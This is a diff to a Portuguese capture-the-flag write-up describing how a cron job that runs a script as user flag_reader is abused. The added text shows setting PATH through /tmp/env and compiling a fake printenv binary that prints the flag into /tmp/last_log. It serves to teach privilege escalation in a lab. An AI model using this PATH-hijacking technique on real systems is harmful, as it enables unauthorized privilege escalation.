@@ -10,7 +10,22 @@ No diretório "/tmp" existe um ficheiro "last_log.txt" que é atualizado todos o
 * * * * * flag_reader /bin/bash -c "/home/flag_reader/my_script.sh > /tmp/last_log"
 ```
 
-Verifica-se que este quando este script é executado, este por sua vez executa `/home/flag_reader/my_script.sh`, e o output é guardado em `/tmp/last_log`. O conteúdo de `my_script.sh` é o seguinte:
+Inicialmente, o conteúdo de `last_log ` é o seguinte:
+
+```note
+SHELL=/bin/sh
+PWD=/home/flag_reader
+LOGNAME=flag_reader
+HOME=/home/flag_reader
+SHLVL=2
+PATH=/bin:/usr/bin:/usr/local/bin
+_=/bin/printenv
+I'm going to check if the flag exists!
+File exists!!
+TODO - Implement this in the near future!
+```
+
+Quando o **cronscript** é executado, este por sua vez executa `/home/flag_reader/my_script.sh`, e o output é guardado em `/tmp/last_log`. O conteúdo de `my_script.sh` é o seguinte:
 
 ```bash
 #!/bin/bash
@@ -25,15 +40,21 @@ printenv
 exec /home/flag_reader/reader
 ```
 
-Podemos ver que, se o ficheiro `/tmp/env` existir, vai ser executado o seu conteúdo como um comando shell usando **xargs**. Posteriormente, serão impressas as variáveis de ambiente através do **printenv**. Assim, podemos alterar a variável de ambiente PATH (para apontar para o diretório com um printenv controlado por nós), colocando o seguinte texto no ficheiro `/tmp/env`:
+Podemos observar que, se o ficheiro `/tmp/env` existir, vai ser executado o seu conteúdo como um comando shell usando **xargs**. Posteriormente, serão impressas as variáveis de ambiente através do **printenv**. Assim, podemos alterar a variável de ambiente PATH (para apontar para o diretório com um printenv controlado por nós), colocando o seguinte texto no ficheiro `/tmp/env`:
 
 ```note
 export PATH=/tmp/myenv/
 ```
 
-Criando o diretório `/tmp/myenv/`, podemos criar um binário printenv dentro que execute um código controlado por nos
+Criando o diretório `/tmp/myenv/`, podemos criar dentro dele um binário printenv que execute um código controlado por nós:
 
-Manipulação do printenv através de um ficheiro c
+```bash
+$ mkdir myenv
+$ cd myenv
+$ touch printenv.c
+```
+
+Este ficheiro c terá o código que mostra a flag:
 
 ```c
 #include <stdlib.h>
@@ -45,4 +66,18 @@ int main() {
 }
 ```
 
+Este código é colocado em printenv.c linha a linha da seguinte forma:
+
+```bash
+echo "linha" >> printenv.c
 ```
+
+No final compilamos o código:
+
+```bash
+$ gcc -Wall -o printenv printenv.c
+```
+
+Finalmente, esperamos uma nova execução de `my_script.sh` através do script do cron. Este executou tal como previsto, porque em vez de escrever as variáveis de ambiente acabou por escrever a flag em `last_log`:
+
+![CTF Opcional 1 b](../img/ctfopcional1b.png)
